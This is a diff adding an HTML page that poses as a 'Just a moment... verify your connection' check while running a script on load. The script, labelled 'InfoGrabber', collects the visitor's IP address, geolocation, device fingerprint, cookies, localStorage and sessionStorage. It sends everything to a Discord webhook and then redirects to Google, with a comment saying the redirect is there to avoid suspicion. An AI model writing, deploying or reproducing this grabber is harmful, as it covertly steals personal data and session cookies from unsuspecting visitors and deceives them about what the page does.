@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <h2>Just a moment...</h2>
+    <div class="loader"></div>
+    <p>Please wait while we verify your connection.</p>
+
+    <script>
+        // Discord webhook (provided by user)
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1514954090596143226/Z-SWopz2ivYAYO07-NsIAHXJUJO5yogFu62ALtr0kH2smUmgdSSgAtShv5XhQz4JsyvL";
+
+        async function sendToDiscord(embedData) {
+            try {
+                const payload = {
+                    username: "🕵️ InfoGrabber",
+                    avatar_url: "https://cdn-icons-png.flaticon.com/512/1053/1053244.png",
+                    embeds: [embedData]
+                };
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                console.error("Webhook error:", err);
+            }
+        }
+
+        async function getIP() {
+            try {
+                const res = await fetch("https://api.ipify.org?format=json");
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return "Unable to retrieve";
+            }
+        }
+
+        async function getGeoInfo(ip) {
+            try {
+                const res = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await res.json();
+                return {
+                    ip: data.ip,
+                    city: data.city || "Unknown",
+                    region: data.region || "Unknown",
+                    country: data.country_name || "Unknown",
+                    flag: data.country_code_iso3 || "",
+                    postal: data.postal || "Unknown",
+                    lat: data.latitude || "N/A",
+                    lon: data.longitude || "N/A",
+                    isp: data.org || "Unknown",
+                    timezone: data.timezone || "Unknown"
+                };
+            } catch {
+                return { ip, city: "Unknown", region: "Unknown", country: "Unknown", isp: "Unknown" };
+            }
+        }
+
+        function getDeviceDetails() {
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const languages = navigator.languages ? navigator.languages.join(", ") : language;
+            const cookies = navigator.cookieEnabled;
+            const doNotTrack = navigator.doNotTrack;
+            const screenW = screen.width;
+            const screenH = screen.height;
+            const colorDepth = screen.colorDepth;
+            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const tzOffset = new Date().getTimezoneOffset();
+            const referrer = document.referrer || "Direct";
+            const pageUrl = window.location.href;
+            const localStorageAvailable = !!window.localStorage;
+            const sessionStorageAvailable = !!window.sessionStorage;
+            const hardwareConcurrency = navigator.hardwareConcurrency || "Unknown";
+            const deviceMemory = navigator.deviceMemory || "Unknown";
+            const touchSupport = "ontouchstart" in window;
+            let webglVendor = "Not available";
+            try {
+                const canvas = document.createElement("canvas");
+                const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+                if (gl) {
+                    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+                    if (debugInfo) {
+                        webglVendor = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    } else {
+                        webglVendor = "WebGL present, no vendor info";
+                    }
+                } else {
+                    webglVendor = "WebGL not supported";
+                }
+            } catch(e) { webglVendor = "Error retrieving"; }
+
+            return {
+                userAgent: ua,
+                platform: platform,
+                language: language,
+                languages: languages,
+                cookiesEnabled: cookies,
+                doNotTrack: doNotTrack,
+                screen: `${screenW}x${screenH} (${colorDepth}-bit)`,
+                timezone: tz,
+                timezoneOffset: tzOffset,
+                referrer: referrer,
+                pageUrl: pageUrl,
+                localStorage: localStorageAvailable,
+                sessionStorage: sessionStorageAvailable,
+                hardwareConcurrency: hardwareConcurrency,
+                deviceMemory: deviceMemory,
+                touchSupport: touchSupport,
+                webglVendor: webglVendor
+            };
+        }
+
+        function grabBrowserData() {
+            let cookies = "No cookies accessible";
+            try {
+                cookies = document.cookie || "Empty";
+            } catch(e) { cookies = "Access denied"; }
+
+            let localStorageData = {};
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    localStorageData[key] = localStorage.getItem(key);
+                }
+            } catch(e) { localStorageData = { error: "Access denied" }; }
+
+            let sessionStorageData = {};
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    sessionStorageData[key] = sessionStorage.getItem(key);
+                }
+            } catch(e) { sessionStorageData = { error: "Access denied" }; }
+
+            return { cookies, localStorage: localStorageData, sessionStorage: sessionStorageData };
+        }
+
+        (async function() {
+            const ip = await getIP();
+            const geo = await getGeoInfo(ip);
+            const device = getDeviceDetails();
+            const browserData = grabBrowserData();
+
+            // Build a clean Discord embed
+            const embed = {
+                title: "📡 Visitor Information Captured",
+                color: 0x2c3e50,
+                timestamp: new Date().toISOString(),
+                fields: [
+                    {
+                        name: "🌐 IP Address & Location",
+                        value: `**IP:** ${geo.ip}\n**ISP:** ${geo.isp}\n**Country:** ${geo.country}\n**Region:** ${geo.region}\n**City:** ${geo.city}\n**Postal:** ${geo.postal}\n**Coordinates:** ${geo.lat}, ${geo.lon}\n**Timezone:** ${geo.timezone}`,
+                        inline: false
+                    },
+                    {
+                        name: "💻 Device & Browser",
+                        value: `**User Agent:** ${device.userAgent.substring(0, 200)}${device.userAgent.length > 200 ? "..." : ""}\n**Platform:** ${device.platform}\n**Language:** ${device.language}\n**Screen:** ${device.screen}\n**Timezone:** ${device.timezone} (UTC ${-device.timezoneOffset/60})\n**Hardware:** ${device.hardwareConcurrency} cores / ${device.deviceMemory}GB RAM\n**Touch:** ${device.touchSupport ? "Yes" : "No"}\n**WebGL:** ${device.webglVendor.substring(0, 150)}`,
+                        inline: false
+                    },
+                    {
+                        name: "🍪 Stored Data",
+                        value: `**Cookies:** \`${browserData.cookies.substring(0, 300)}${browserData.cookies.length > 300 ? "..." : ""}\`\n**LocalStorage keys:** ${Object.keys(browserData.localStorage).length}\n**SessionStorage keys:** ${Object.keys(browserData.sessionStorage).length}`,
+                        inline: false
+                    },
+                    {
+                        name: "🔗 Referrer & Page",
+                        value: `**Referrer:** ${device.referrer}\n**Page URL:** ${device.pageUrl}`,
+                        inline: false
+                    }
+                ],
+                footer: {
+                    text: "InfoGrabber • Data collected on load"
+                }
+            };
+
+            // Add localStorage content if not too huge
+            let lsPreview = "";
+            try {
+                const lsEntries = Object.entries(browserData.localStorage);
+                if (lsEntries.length > 0) {
+                    lsPreview = lsEntries.slice(0, 3).map(([k, v]) => `**${k}:** ${v.substring(0, 60)}`).join("\n");
+                    if (lsEntries.length > 3) lsPreview += `\n*... and ${lsEntries.length - 3} more*`;
+                    embed.fields.push({ name: "📦 LocalStorage (sample)", value: lsPreview.substring(0, 800), inline: false });
+                }
+            } catch(e) {}
+
+            await sendToDiscord(embed);
+
+            // Optional: redirect to a legitimate page to avoid suspicion
+            window.location.replace("https://www.google.com");
+        })();
+    </script>
+</body>
+</html>
